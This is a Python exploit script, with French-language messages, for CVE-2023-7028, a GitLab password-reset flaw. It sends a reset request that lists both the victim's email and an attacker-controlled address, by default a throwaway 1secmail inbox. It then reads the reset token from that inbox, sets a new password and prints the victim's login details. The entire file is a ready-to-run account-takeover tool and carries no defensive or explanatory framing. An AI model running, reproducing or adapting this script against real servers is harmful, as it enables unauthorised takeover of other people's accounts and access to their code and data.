import requests
import argparse
from urllib.parse import urlparse, urlencode
from random import choices
from time import sleep
import re

requests.packages.urllib3.disable_warnings()

class TempEmailService:
    def __init__(self):
        self.api_base_url = "https://www.1secmail.com"
        self.available_domains = []

    def fetch_domains(self):
        response = requests.get(self.api_base_url).text
        self.available_domains = re.findall(r'<option value="([a-z.1]+)" data-prefer', response)

    def generate_email(self):
        if not self.available_domains:
            self.fetch_domains()
        if not self.available_domains:
            return None
        username = ''.join(choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
        domain = choices(self.available_domains, k=1)[0]
        return f'{username}@{domain}'

    def get_email_ids(self, username, domain):
        response = requests.post(f'{self.api_base_url}/mailbox', verify=False, data={'action': 'getMessages', 'login': username, 'domain': domain}).text
        return re.findall(r'<a href="/mailbox/\?action=readMessageFull&(.*?)">', response)

    def fetch_latest_email(self, email_address):
        username, domain = email_address.split('@')
        email_ids = self.get_email_ids(username, domain)
        if not email_ids:
            return None
        response = requests.get(f'{self.api_base_url}/mailbox/?action=readMessageFull&{email_ids[0]}', verify=False).text
        return response.split('<div id="messageBody">')[1].split('<div id="end1sMessageBody">')[0]


class GitLabPasswordResetExploit:
    def __init__(self, gitlab_url, victim_email, attacker_email=None):
        self.parsed_gitlab_url = urlparse(gitlab_url)
        self.victim_email = victim_email
        self.attacker_email = attacker_email or TempEmailService().generate_email()

        if not self.attacker_email:
            print('Erreur lors de la génération de l\'email temporaire. Arrêt.')
            exit()

        self.session = requests.session()

    def retrieve_authenticity_token(self, reset_token=''):
        endpoint = f'/users/password/edit?reset_password_token={reset_token}'
        response = self.session.get(f'{self.parsed_gitlab_url.scheme}://{self.parsed_gitlab_url.netloc}/{endpoint}', verify=False).text
        token = re.findall(r'<input type="hidden" name="authenticity_token" value="(.*?)" autocomplete="off" />', response)
        return token[0] if token else None

    def retrieve_csrf_token(self):
        response = self.session.get(f'{self.parsed_gitlab_url.scheme}://{self.parsed_gitlab_url.netloc}/users/password/new', verify=False).text
        token = re.findall(r'<meta name="csrf-token" content="(.*?)" />', response)
        return token[0] if token else None

    def initiate_reset_request(self):
        csrf_token = self.retrieve_csrf_token()
        if not csrf_token:
            return False

        data = urlencode({
            'authenticity_token': csrf_token,
            'user[email][]': [self.victim_email, self.attacker_email]
        }, doseq=True)

        headers = {
            'Origin': f'{self.parsed_gitlab_url.scheme}://{self.parsed_gitlab_url.netloc}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.parsed_gitlab_url.scheme}://{self.parsed_gitlab_url.netloc}/users/password/new',
            'Connection': 'close',
            'Accept-Language': 'fr-FR,fr;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        response = self.session.post(f'{self.parsed_gitlab_url.scheme}://{self.parsed_gitlab_url.netloc}/users/password', data=data, headers=headers, verify=False).text
        return 'If your email address exists in our database' in response

    def extract_reset_token_from_email(self, email_content):
        match = re.findall(r'/users/password/edit\?reset_password_token=(.*?)"', email_content)
        return match[0] if match else None

    def obtain_reset_token(self, max_attempts=5, interval=7.5):
        if self.attacker_email:
            for attempt in range(max_attempts):
                sleep(interval)
                latest_email_content = TempEmailService().fetch_latest_email(self.attacker_email)
                if latest_email_content:
                    return self.extract_reset_token_from_email(latest_email_content)
        else:
            link = input('Entrez le lien de réinitialisation reçu par email: ')
            match = re.findall(r'(https?://[^"]+/users/password/edit\?reset_password_token=([^"]+))', link)
            return match[0][1] if len(match) == 1 else None

    def perform_password_reset(self, new_password=None):
        reset_token = self.obtain_reset_token()

        if not reset_token:
            print('Échec de l\'obtention du jeton de réinitialisation. Arrêt.')
            return False

        new_password = new_password or ''.join(choices('abcdefghijklmnopqrstuvwxzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=20))
        authenticity_token = self.retrieve_authenticity_token(reset_token)
        if not authenticity_token:
            return False

        data = {
            '_method': 'put',
            'authenticity_token': authenticity_token,
            'user[reset_password_token]': reset_token,
            'user[password]': new_password,
            'user[password_confirmation]': new_password
        }

        response = self.session.post(f'{self.parsed_gitlab_url.scheme}://{self.parsed_gitlab_url.netloc}/users/password', verify=False, data=data).text
        if 'Your password has been changed successfully.' in response:
            print('Réinitialisation du mot de passe réussie!')
            print(f'URL de connexion: {self.parsed_gitlab_url.scheme}://{self.parsed_gitlab_url.netloc}/users/sign_in')
            print(f'Email: {self.victim_email}')
            print(f'Nouveau mot de passe: {new_password}')
        else:
            print('Échec de la réinitialisation du mot de passe.')


def parse_command_line_args():
    parser = argparse.ArgumentParser(description='Outil d\'exploitation pour CVE-2023-7028 sur GitLab')
    parser.add_argument("-u", "--url", type=str, required=True, help="URL de GitLab")
    parser.add_argument("-t", "--target", type=str, required=True, help="Email de la cible")
    parser.add_argument("-e", "--evil", type=str, help="Email malveillant (optionnel)")
    parser.add_argument("-p", "--password", type=str, help="Nouveau mot de passe (optionnel)")
    return parser.parse_args()


if __name__ == '__main__':
    args = parse_command_line_args()
    exploit = GitLabPasswordResetExploit(gitlab_url=args.url, victim_email=args.target, attacker_email=args.evil)
    if not exploit.initiate_reset_request():
        exit()
    exploit.perform_password_reset(new_password=args.password)

